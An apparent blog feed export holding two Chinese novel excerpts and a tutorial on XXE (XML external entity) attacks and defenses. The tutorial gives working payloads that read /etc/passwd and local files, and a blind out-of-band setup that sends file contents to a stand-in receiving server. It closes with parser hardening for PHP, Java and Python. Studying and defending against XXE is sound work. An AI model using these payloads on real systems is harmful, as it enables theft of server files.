紧紧地搂着月姬，我微笑着，即使面对死亡，我也有月姬相伴，死而无憾了。只可惜，今生无法再与梅生相见，也不知他身在何处？ [5.0］ 再见到林枫是几天后的事了。 凭借着林家堡的势力，林枫轻而易举地来到了秘密监牢。牢门缓缓开启，随着清脆的脚步声，迎面而来的是一席黑影。翻起头顶的黑帽后，一张俊秀的脸庞显露无疑。然而，此时林枫的脸上却显得异常的阴沉。他叹了口气，沉重地说道：“刺兄，看来是梅生想陷害你啊！”。 没等我回过神来，林枫就向我讲诉了劫狱当晚的情景。他说，那晚我进入监牢后，林枫便一直在暗处保护我，没想到梅生走后没多久便带着大批军队冲进了监牢，林枫深知中了梅生的套，便逃离了现场，准备日后再伺机营救。 凭借着与梅生朝夕相处二十几年的关系，我自然不会相信林枫的鬼话。至于，事实是否如林枫所诉，我不得而知，只是内心那份对梅生的兄弟情义告知我，不能怀疑他，即使世上只有我们三人手臂拥有莲花刺青，即使梅生迟迟没有露面。 林枫走后，他口中诉说的场景夜夜出现在我的梦中。梅生手持长剑，抵在我的脖颈，随即传来阵阵冷笑，冰冷刺骨。每个望不见星空的夜晚，我都被相同的梦境折磨着，梅生成了我逃不出梦魇。 林枫隔三岔五地到访监牢，每次都会带来梅生的情况。据他所说，梅生自从离开监牢后，便回到了家中。眼看着行刑期越来越近，我显得焦虑不安。相同的梦境，时时刻刻浮动在我的脑海中。林枫看出了我的焦虑，心生一计，凭借着他的势力，偷龙转凤也并不算难。在我们秘密相商后，林枫甘愿暂时代替我深陷牢笼，待我出去寻得梅生，把此事问清楚后，再换回林枫。 出发前，林枫无比坚信地望着我，默默地点点头，眼神不再是初次见面时的不屑，而是充满着信任与期许。 踏出监牢的大门，我飞身跃向半空，调动着全身的真气，踏着片片屋瓦飞向远方。 落地家门前的清溪岸，记忆如潮水般涌入大脑。那些年，梅生装睡的神情，梅生气得破口大骂的囧样，都历历在目。推开老旧的木门，随着咯吱的声响，阳光汇聚成一道光线，透着门缝照入屋内。梅生静坐堂前，紧闭的双目缓缓睁开，脸上不再是以往的春光，而是略显忧伤。 梅生摆了摆手，示意我坐在身旁，面对着眼前熟悉而陌生的梅哥，我乱了心神。望着我，梅生眼神中带着几分欣慰，说；“阿青，你能安然无恙的回来，我就放心了！”随即转眼定睛于远方，眼神中满是忧伤。沉默片刻，梅生冷冷地笑着，只是脸上僵硬得面无表情，说：“你什么都不用问了，一切都是我干的，是我对不住你。答应我，一定要好好活着！”。说话间，梅生拿出了早已藏于怀中的匕首，狠狠地刺向了自己的心门，血流了一地。 我扶起倒地的梅生，望着他空洞的眼神中透露出来的悲伤，泪水溢满了眼眶。紧紧地抱着奄奄一息的他，我发了疯似地喊着，“为什么，这究竟是为什么？”。梅生贴着我的耳朵，死命地重复说着：“弟弟，快走！”。 随后，我便明白了梅生的意思。随着一阵阵脚步声，屋外集结了大批的军队，把老屋围得严严实实。 [6.0］ 天光照在清溪上，水面闪显出层层白光，倒映出溪岸边的重重杀机。 拉开木门，迎着刺眼阳光下的是一层盔甲反射出的白色光芒。勉强地眯拢着双眼，待适应强光后，眼前渐渐清晰。前后几排的长弓兵，身披白皑皑的盔甲，手持长弓，伺机待发。随着一声号令，无数的弓箭从天而降，密如细雨，直直的射向屋内。 千钧一发之际，我迅速关闭了木门，向后连翻数次，只见弓箭从我身边唰唰直下。我搬起一张木桌，挡在身前，随着掩护慢慢靠近梅生的尸体。木桌下，我抱起梅生，听着屋外被箭射穿的声音，似乎看到了地狱的大门。 以往，每当走到生死关头，梅生都会奋不顾身地出现，而今，一切都不复存在了。片刻后，屋外停止了响动。我依附着地面，爬到窗前，透过被箭射穿的洞口望向屋外，成排的长弓兵装填着弓箭，手中握着火把。 随着一阵熟悉而陌生的冷笑，从人群中走出一个身影。透过窗户，清楚的看见身影的轮廓，包括那双不屑的眼神。林枫慢慢接近老屋，随即推开了木门。盯着踏入屋内的林枫，我眼神中透出绝望。林枫向我瞥了瞥眼，露出不屑的眼神，如同几年前的初次相遇，冷冷地说：“刺兄，可安好啊”，随即放声大笑。 我抹搽着眼角的泪水，淡淡地说道：“我早该想到是你”。林枫走向躺着的梅生，疯狂地踩踏着他的尸体，眼神中满是愤恨。我随即拿出腰间的弯刀，狠狠地刺向林枫。林枫回过神来，脚尖轻轻一弹，轻松躲开了我的刀锋。眼见扑了个空，我全力调动真气于刀尖，砍向林枫。然而，林枫的轻功远非我能及，数次进攻都被他轻松躲过。不知不觉中，他已绕到我的脑后，瞬间一把利刃穿胸而过，流淌出鲜血。随之而来的是一真呐喊，不要！月姬含着泪水，奔向屋内，眼看着就要接近倒地的我，却被林枫拦下。 “月妹，今天是我们报仇的大好日子，哭哭啼啼的像什么样子”林枫指着我对月姬说道：“怎么，心疼了？”。月姬带着哭腔说道：“哥，你答应过我不杀他的”。林枫吼叫着，“对仇家不可存仁慈之心，就像当年他们没有杀死我们，而今，我们得以报仇雪恨，对敌人的仁慈就是对自己的残忍。”说话间，林枫瞪大着双眼，死死地盯着我。 我冷笑着，干涩的眼睛已流干了泪，绝望地看着眼睛两位曾经的至亲至爱，说：“好！原来你们隐瞒了这么多秘密，原来这一切都只是你复仇的计划。如今，我也已是快死之人，有什么秘密都说出来吧，至少让我死得瞑目。” 林枫解开上衣，露出了手臂，那朵散发着青光的莲花清晰可见。他说，我们都属于青莲族人，手臂上的刺青是我们的族标。我们的族人，从前生活在遥远的北都，远离中土的纷扰。然而，直到一场瘟疫的爆发，使得族人死伤无数，最后只剩两大家族逃离出来，从此定居在了风莲国。而这两大家族，便是秋梅两家。梅生是我的亲兄弟，月姬则是林枫的亲妹妹。自从定居风莲国后，日子便一天天好转。可没曾想，一天夜里秋家突发大火，秋家人除了死里逃生的林枫与月姬，其余全都葬身火海。逃生后的林枫一口咬定，我的父母就是纵火的元凶，从此便对梅家积下了深仇大恨。 月姬紧紧地捂住耳朵，眼中不住的流泪。为了保住刺青的性命，月姬不惜牲牲良知帮助林枫，可她没想到，林枫的复仇计划中，从来就没有道义与守信。林枫说，劫狱当晚，逃离后的梅生望着冲入监牢的守兵，奋不顾身的折返营救，不料途中中了林枫早已布好的陷阱。然而，当梅生知道林枫的身份后，苦苦祈求林枫放过我，自己甘愿扛下所有的罪过，包括多年前秋家的那场火灾。就这样，林枫借着对我骗取的信任，借着梅生对我的愧疚，毫不留情地展开了他的复仇计划。而月姬只是整盘复仇计划中的一枚棋子，也是整个计划的开始。林枫放声大笑道，“那场大火之后不久，你们梅家便一年接一年的死人，真是报应啊。直到只剩下你俩，你哥便隐姓埋名，远离故居。时间能改变你们的名字，改变你们的容貌，却永远改变不了你们手臂上的刺青”。 我不解道，“你们怎么知道我手臂上的刺青？”。林枫望着月姬笑道，“月姬手臂上的莲花刺青显露于世人，本就是为了找出你们所安排的。平常人看了此刺青，定会心生好奇，而数月来我一直在暗中观察，只有你不为所动。原因只有一个，就是你也拥有莲花刺青”。 我仰天大笑着，直至嘴角流出鲜血，我强撑着最后一口气，望着神情恍惚的月姬，说：“你爱过我吗？”。 月姬沉默着，闭上眼的最后一刻，我望见月姬举起了匕首。…… [7.0］ 匕首深深地插入月姬的心胸，鲜血从胸口流向地面，从地面流向刺青倒下的身躯。 林枫抱着奄奄一息的月姬，痛苦不已。从出生到现在，林枫唯一一次流下了眼泪，即使当年眼看着家人葬身火海，林枫愣是一点泪也没流。 月姬仰起头，凑着林枫的耳朵，断断续续地说，“哥……我觉得好轻松……我走后……你要……要好好照顾……自己”。林枫抱着断气的月姬怒吼着，响声震彻山谷。 林枫抱着月姬走出老屋，随即箭雨伴随着火焰，射向屋内，顿时一片火海。黑云压近，凡世间的尘埃浮浮滚滚，汇聚湿润的黑云，酝酿着一场暴雨。磅礴的雨滴敲打着大地，淋湿了早已脆弱不堪的心，几十年间的尘埃，随着滚滚而去的雨水，流淌在大地之上，消散于光阴之中。 林枫坐立悬崖边，抚摸着怀中的月姬，仰天承受着上天的洗礼。磅礴的大雨，落在林枫的发间，眉间，如织的记忆伴随着雨水，流淌进他的心里，尘封的往事渐渐清晰。 二十年前，秋家大院内，四个孩子嬉笑着。秋老爷在一旁看得乐在其中，随即设宴款待梅家两位公子。宴席间，秋老爷拿出一本武功秘籍赠与两位公子，并嘱咐要好生研习。年少的秋枫身为秋家大公子，曾多次恳求秋老爷教授武功，却屡屡遭到打骂。要说天赋，秋枫是四人中最好的，然而，在秋老爷心中，秋枫戾气太重，并不适合练武，因此始终没有传授秋枫武功。长此以往，年少的秋枫心中横生恨意，便在一个夜深人静的晚上偷出了家传的武功秘籍，不料却被秋老爷发现。惜子的秋老爷不忍下重手，秋枫则趁机暗施黑手，杀害了秋老爷。为了毁尸灭迹，秋枫纵火烧了秋老爷的房间。谁知火势瞬间就无法控制，四处蔓延至整幢大宅，秋枫见状赶忙叫醒了睡梦中的秋月，逃离了火海。因为对梅家两位公子的嫉恨，秋枫便把纵火的元凶推给梅家。 逃离后的秋枫幸得林家堡收留，改姓为林，而为了防止秋月道出整个事件的始末，便将她卖入了云烟楼，艺名月姬。自此以后，秋枫便不断雇凶杀害梅家人，直到只剩下梅家两位公子神秘失踪。 随着时间的推移，林枫对父母对妹妹的负罪感渐渐消失，反之剧增的便是对梅家的仇恨。甚至，在他脑中的那段记忆已经变形，那个纵火烧死自己家人，将自己妹妹卖入云烟楼的不再是自己，而是梅家人。 时光荏苒，仇恨在林枫心中越演越烈，直到他得知了梅家两位公子的下落，复仇计划就在他心中生根发芽。月黑风高的夜晚，他身穿黑衣潜入高府宅院，杀害高老爷后，撕下袖子，在月光下露出散发着青光的莲花刺青。 月姬被捕后，利用刺青对她的爱，一步步地把他与梅生引入圈套。最后，只需凭借着自己骗取的信任，挑拨梅家两兄弟的关系，使两人互相残杀，而自己坐收渔翁之利，让他们如同当年的秋家人，葬身火海。 然而，无论他的计划多周密，月姬对刺青的真情是他无法控制的。而在月姬心中，自己不顾一切地帮助着林枫，只是为了保护自己深爱的刺青。也为了自己唯一的亲人能早日回头，月姬一直隐瞒着当年的那段尘封往事。可她不明白，那个曾经救自己出火场的秋枫早已葬身火海，而后的林枫只不过是一具被仇恨包裹着的行尸走肉。 躯壳下的灵魂早已不在，不变的只是手臂上散发着青光的莲花刺青，刻下了凄美的伤疤，无法抹去，深入骨髓。 [8.0］ 尘封的往事渐渐清晰，而林枫的心却渐渐迷茫，自己多年筹划的复仇计划，自己设身处地想置于死地的梅家，只不过是自己为当年罪行找的替罪羊。 大雨冲刷着大地，尘埃流失后露出那个找寻多年的凶手竟是自己，林枫痛哭流涕，紧抱着月姬，悲痛的哭喊着，夹杂着暴雨声，久久回荡在尘世。 [9.0］ 伴随着雨滴，林枫抱起月姬，纵身跃入了万丈悬崖。…… 后记 这是一篇故事相对比较苍白的小说，文风也比较小白，现在读起来感觉很多情节不够合理，但本篇的题材是我偏爱的那种。]]></content>
      <categories>
        <category>诗意年华</category>
      </categories>
      <tags>
        <tag>原创小说</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈XXE漏洞攻击与防御]]></title>
    <url>../../../../../../../../2017/06/20/1/</url>
    <content type="text"><![CDATA[你会挽着我的衣袖，我会把手揣进裤兜 之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。 XML基础在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。 XML文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。12345678910111213141516171819&lt;!--XML申明--&gt;&lt;?xml version="1.0"?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; 由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。 DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD:1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:1&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt; DTD文档中有很多重要的关键字如下： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。完整的实体类别可参考 DTD - Entities 实体类别介绍参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体：1&lt;!ENTITY 实体名称 "实体的值"&gt; 外部实体:1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 参数实体：123&lt;!ENTITY % 实体名称 "实体的值"&gt;或者&lt;!ENTITY % 实体名称 SYSTEM "URI"&gt; 实例演示：除参数实体外实体+内部实体123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name "nMask"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; 实例演示：参数实体+外部实体12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt; %name;]&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：实例演示：123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; XXE漏洞XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 xxe漏洞检测第一步检测XML是否会被成功解析：1234&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name "my name is nMask"&gt;]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; 如果页面输出了my name is nMask，说明xml文件可以被解析。 第二步检测服务器是否支持DTD引用外部实体：12345&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM "http://localhost/index.html"&gt; %name; ]&gt; 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。如果支持引用外部实体，那么很有可能是存在xxe漏洞的。 xxe漏洞利用xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。 读取任意文件由于我是在windows上做的测试，因此让其读取c盘下的test.txt文件内容。如果是linux下，可以读取/etc/passwd等目录下敏感数据。 以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。 blind xxe漏洞对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 创建test.php写入以下内容：123&lt;?php file_put_contents("test.txt", $_GET['file']) ; ?&gt; 创建index.php写入以下内容：123456789101112131415&lt;?php $xml=&lt;&lt;&lt;EOF &lt;?xml version="1.0"?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM "file:///C:/test.txt"&gt; &lt;!ENTITY % remote SYSTEM "http://localhost/test.xml"&gt; %remote;%all;%send; ]&gt; EOF; $data = simplexml_load_string($xml) ; echo "&lt;pre&gt;" ; print_r($data) ; ?&gt; 创建test.xml并写入以下内容：12[html] view plain copy&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'&gt;"&gt; 当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 注：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍啦 xxe漏洞修复与防御使用开发语言提供的禁用外部实体的方法PHP：1libxml_disable_entity_loader(true); JAVA:12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 参考文档https://security.tencent.com/index.php/blog/msg/69http://blog.csdn.net/u011721501/article/details/43775691https://b1ngz.github.io/XXE-learning-note/http://bobao.360.cn/learning/detail/3841.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xxe漏洞</tag>
        <tag>xml注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【原创小说】盲爱]]></title>
    <url>../../../../../../../../2017/06/15/1/</url>
    <content type="text"><![CDATA[我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受直到我渐渐明白了爱情的真谛，那便是可以让我变成你 最近想研究下SSRF漏洞，听说QQ空间、朋友网分享功能处曾经发现过此漏洞，于是我便打开了多年未用的QQ空间。原本我应该打开抓包软件，静静地分析起来，然而当我无意中看到空间日志中记录着的那些年少青春，思绪忍不住回到了4年以前，那个还是白衣少年的时光，于是便着急分享分享当年的文章。 我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。我也不断地在倾听尘世的爱情，却怎么也想象不出其中的风景，毕竟如今我的世界只剩下黑暗。 原本我也亲眼见过那些美好的爱情故事，也目睹过那些忧伤的青春历程。但如今，那些已经成为我脑海中关于爱情的唯一记忆。杨花落尽，尘世一夜凋零，只有那无尽的黑暗取代了繁华似锦。 关于那场车祸，大致发生在一年前。劫难重生后，我便永远失去了光明，以及小娜美丽动听的声音。由于车祸，小娜的声线受到了严重创伤，恐怕这辈子都无法复原。尽管如此，自那以后她还是每日来到家中帮忙照顾我，毕竟家里只剩下了年迈的母亲。 小娜是我唯一的女友，从高中到现在一直都是。原本我们打算进阶婚姻的殿堂，只可惜邂逅了那场车祸。从此她成了哑巴，而我则成了瞎子。当一名瞎子与哑巴交流时，语言与手势已经无济于事，于是她便在我的左手心画字，以此来传达讯息。 我常常询问她为何只在我的左手心画字，她笑而不语，随后在手心画上了两个字：秘密。 虽然我的视线中只有无际的黑暗，但小娜的身影却如同一盏明灯般时时浮现。我知道，她一直在我身旁，有时甚至我会紧紧地抱着她，亲她。但她总是害羞地在左手心写上：妈在看我们。 我不知道为什么每次好事将近时，母亲总是站在不远处看着我们，当然这是小娜所传达的讯息。于是，我便会喊叫一声：“妈，你在吗？” “诶，在，妈在。”母亲的声音越发沧桑，虽然看不见她的脸，但我能隐约感觉到她在流泪。 “妈，今晚做顿好吃的吧，小娜说她饿了。”我朝着母亲嬉笑道。 “嗯……嗯，好，好。”母亲楞了楞神，随后擦拭着脸颊的泪水，轻声应道。 望着母亲转身而去的背影，小娜在我的手心写上：我才没说饿了呢，是你饿了吧。 我嬉笑着迎合她，我知道此刻她一定是在对我吐舌翻白眼。这一切就好像从前，当我能看见她，她也能在我身边歌唱那会儿。她生气时的神情，她撒娇时的动作，都历历在目。只是此刻也只能凭借着记忆想象出她的神情与动作，大概还是与从前一样吧。 每当我坐在窗前，听着窗下的繁华似锦，眼前总会浮现出小娜的身影，而她也时时陪伴在我身边。我时常向她讲述我们以往的故事，那些爱情故事。她也总是聚精会神地聆听着，还时不时地插上几句。 我对她说，我们相识于夏末，相知于深秋，相爱于暖冬。我问她是否还记得那如柳絮般飘零的雪花？她沉默不语，随后便在左手心画了个大大的勾。我满意地笑了笑，随后又说，那场雪下得很大，大得将要把我俩淹没，但我们还是一如既往地站在那片白茫之上，因为你说我们要在那堆出最大的雪人，我们办到了。说完，我的眼泪也不住地挂出了眼眶。小娜温柔地拭擦去我眼角的泪水，在左手心写上：那是我见过最大的雪人。 小娜不在的时候，我也总是会一个人自言自语。后来，我独自聊到了那场车祸。那会我们坐在婚车上，准备驶向婚姻的殿堂，却差点就在天堂举行。呵呵，我坐在那静静地傻笑，笑这弄人的命运，笑这无情的苍天。 “你来了啊。”笑声落地后，我知道小娜来了，于是我招呼她坐在身边。她沉默不语，随后在我的左手心写上：妈说，她很爱你。 片刻后，我隐约听到她拉动窗帘的声响，于是大叫道：“小娜，别！别拉开窗帘。对我来说，此刻有没有它已不重要，重要的是你时时在我身边。”说罢，我伸出手臂，向着窗帘的方向招了招手：“来，到我身边陪着我。”我像只受伤的小猫，时刻离不开主人。 随后我感受到了小娜带来的温度，仿佛寒冬里的一拂暖阳，融化了我内心的悲伤。我紧紧地抱着她，这次我没有理会躲在角落观看的母亲，我毅然亲吻了她，那种感觉就好像梦境。 “我们继续完成那场夭折的婚礼好吗？”我祈求着小娜，眼角似乎干涩地流不出泪。 随后，我感受到了小娜在摇晃脑袋。她又一次拒绝了我，我已数不清这到底是我多少次的失败。后来，她如往常般在我的左手心画叉。停顿片刻后，她继续缓缓写上：我想让你一起亲眼见证那个时刻。 我欣慰地浅浅一笑，于是便开始期待重现光明的那一刻。 往后的那段时光中，我总是呆呆地坐在窗前，然后寻问身后的母亲：“妈，你说我的眼睛啥时能好呢？小娜可在等着我呢。” “快了，快了。”这是母亲一贯的回答，我也已经听了无数遍，只是不知道她口中的“快了”是还要多久。我只知道母亲为了我找了不少医生，虽然有时他们隔得很远，但小娜说他们都在看着我摇头，我知道他们与母亲的谈话充斥着无奈。也许，真的是无药可救了吧。 每当医生摇头离开后，小娜总会紧握着我的手，在身旁不停地安慰我，但我知道其实她的心比我更痛。我抚摸着她的脸，让她别哭，她也抚摸着我干涩的眼角，在手心慢慢写道：一切都会好的。 这天，母亲叫离了我，将我扶到屋子一角。随后她对着我说，她要跟小娜谈谈。她渐渐走远了，但她与小娜的谈话却字字入耳，当然只是她一人在说：他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光…… 我不知道为什么母亲要跟小娜聊这些，我只是觉得母亲变了，变得魂不守舍，变得语无伦次。虽然耳边没有小娜回应的声音，但我隐约感觉到她在微微点头。渐渐地，我感觉她们的谈话越发得模糊，最后便完全听不清了。 母亲走后，小娜朝着我俏皮地做了个鬼脸，不知为何我感觉到了她的动作神情，也许只是感觉吧。我对她微微一笑，淡淡地问道：“妈跟你说了什么呀？” 她在左手心上写道：妈说，让我俩尽快完婚。 我微微一惊，满脸疑惑地回应道：“是……是吗，但……但是我的眼睛好不了了，不是吗？” 小娜没有回应我，只是静静地依偎在我怀里，聆听着我心脏的跳动。过了半响，她才淡淡地写道：“我会让你复明的。” 后来，小娜就从我身边消失了。那天，我竖起耳朵想要听清她发出的细微声音，可惜听到的只有越渐远离的脚步，最后连脚步声也消失不见了，剩下的只有死一般的寂静。 小娜离开后，我仿佛一个人过了很久很久，久得不知道年月。那些天，我还是照常坐于窗边，听着窗外热闹的街道，听着窗边呼啸而过的风，还有，还有那满天飘零的雪。 “冬天，来了吗？”我在心里这样念叨，毕竟瞎子的世界不仅没有白昼，更分不清年月。“呵呵，时间过得可真快，小娜呢，离开多久了？大概快半年了吧。” 母亲还是习惯性地轻轻推开一道门缝，透过缝隙静静地观察坐立窗边的我，一切都是那么无声无息。但是瞎子的听觉是异于常人的，因此每每她推开房门我便都能觉察到，但也只是彼此相对无声。 我原本以为时间就会这么一直匆匆逝去，直到我两鬓斑白，直到母亲西去独留我于尘世。然而上苍还是有好生之德，也许它并不喜欢凡尘的俗子就这样苟活于人世吧。 不久后，母亲口中的“快了”终于将要应验。那天，她兴奋地跑到我面前，激动地说：“妈给你找了全省最好的医生，这回你一定能变好。”说罢，她便哽咽地泪流满面。不知为何，我没有她那般兴奋，也许是因为小娜不再了吧！ 片刻后，我隐约看到了一丝光线，却异常得模糊刺眼，以至于我下意识地想反抗这种光亮，于是我紧闭着眼睛，久久没有睁开。我猜想，医生一定是用电筒照了我的眼眸。后来，我开始反感一切明亮之物，因为它会让我觉得很痛。于是，到最后医生也只能无奈地离去。 他离开时，母亲就站在门外透过门缝看着我们，我知道她一定在那，因为她一直在那。房门关闭后，我隐约听到了母亲与医生的交谈，但内容便听不清了，我也不打算听清，大概又是些医学的专业名词以及一些无奈之语吧。 我呆呆地坐在那，心想：呵呵，真的是无药可救了吧！小娜，你在哪呢？”一个人待久了便会回望，于是我开始回想起很多事，包括与小娜在一起的那段时光。后来，我想起了小娜写给我的最后一句话：我会让你复明的。 我始终没能明白她话里的含意，也许只是一种安慰之词吧。直到后来，她再一次出现了。我不知道那是在清晨、黄昏还是午夜，反正她来了，衣肩似乎还带着点雪花。她静静地走到我身边，轻轻抚摸着我的脸颊，手心很凉，但我却感到很温暖。 “小娜，你去哪了？”我低声问道，眼眶打着泪珠。 她照常抚平我的左手心，然后缓慢地写道：我一直在你身边看着你呢。 “你……你为什么躲着不见我呢？”我失落地问道。 随后，我感觉她的脸颊微微一笑，好似看待撒娇的小孩那般看着我。紧接着，我感受到了左手心书写的字：因为我在找让你复明的方法。 “找到了吗？”我语气平淡地问道。 她犹豫了会，然后继续写道：嗯，我带你去个地方吧。 她这样写道，还没等我反应，她便拉着我往外走。我兴奋地笑了，因为我已经好久没有出过房门。不过不久后她便停下了脚步，她说，母亲正在门外静静地看着我们。 “妈，你在吗？”我照常大叫道。 “诶，在，妈在。”听着母亲抹泪后的回应，我心里不免一丝伤痛，因为只有她一直守候在我身边。我顿了顿身，朝着身边的小娜看了眼，虽然只有漆黑一片，但我知道她就在那，然后转头对着母亲说：“妈，我跟小娜要出去走走，你就在家等着我们吧。” “诶……好……好，路……路上小心。”母亲颤颤巍巍地答道。 获得母亲的允许后，小娜便引着我踏上了屋外的世界。虽然看不见，但我依然听见了走离房间后的关门声，以及屋外瑟瑟的寒风。小娜说，外面是漫天的雪，就好像高中那会我们堆雪人时的那样，漫天飘零。在小娜的描述下，我似乎看见了那片雪地。我俯身随机抓了一把，手心忽感一阵凉意，那应该就是雪的温度吧。 这天，小娜带着我踏遍了无数的雪地，堆了各式的雪人。那些快乐的场景，那些雪人的模样，那场漫天的暴雪，还有小娜可爱迷人的姿态，一切都历历在目，虽然此刻我看不见。 我们在雪中玩了很久很久，久得忘记了白天黑夜。直到小娜说，她要走了。于是，我们便只能这样遗憾的散场，彼此缓缓撇下手心的最后一把雪。 回到家的时候，母亲似乎不在。我邀请小娜坐到我身边，陪着我聊天，陪着我看那场依然没有消散的雪。但她说，她要走了。起初我还以为她只是想回家，直到此刻我才知道，她是想离开我。 我紧紧地握着她的手，一刻不放，苦苦哀求道：“小娜，求你了，别离开我！” 她用力甩了甩手，力气大得将我摔倒在地。见状，她紧张地凑近我的身子，在左手心上写道：我找到了让你复明的办法，但我必须得离开你。 “不，不，如若这样，我宁愿永远活在黑暗中。”我嘶叫着，眼中满是恐惧与痛苦。 小娜没有继续写道，只是扶着我静静地走到窗边。她轻轻掀开了窗帘一角，我似乎看到了她嘴角的浅笑。她让我看一看窗外的世界，我顺着她的目光挪步到窗前，但迎面而来的只有刺眼的强光。我睁不开眼，只得用手挡住视线，我哀求道：“小娜，我的眼睛很痛，不，胸口很痛，求你把窗帘拉上吧！” 小娜没有理会我的哀求，只是转过脑袋静静地看着我。透过强光，我仿佛看到了她那双不舍的眼睛，似乎正在跟我说着离别。我眯着眼，试图看清她的模样，看清她眼角的泪，心中的伤。然而视线中却只有刺眼的天光，无尽延伸后迷茫了一切。 “小娜”我这样呼唤着她，但她只是看着我微微一笑。而后我似乎看见她轻轻地打开了玻璃窗，窗外吹进的清风吹拂了她的长发，风中衣袂飘飘。 迎着天光，迎着清风，她回眸一笑。我也笑了，笑得很甜，因为此刻她在我眼中很美，她穿着嫁衣，白色嫁衣。我渐渐明白，她是想与我一道完成那场婚礼，因为我已经渐渐看清了她的容颜。 我慢慢地走近她，想近距离地看清她，抚摸她。然而，她伸出右手阻止了我，她嘴角微微一笑，笑出了声，似乎还没等到我走出这迷幻的世界，她便已纵身跃向了窗外的纷飞繁华。 “不！”我疯狂地吼叫着，试图挽回跳窗而下的小娜，但已为时过晚。 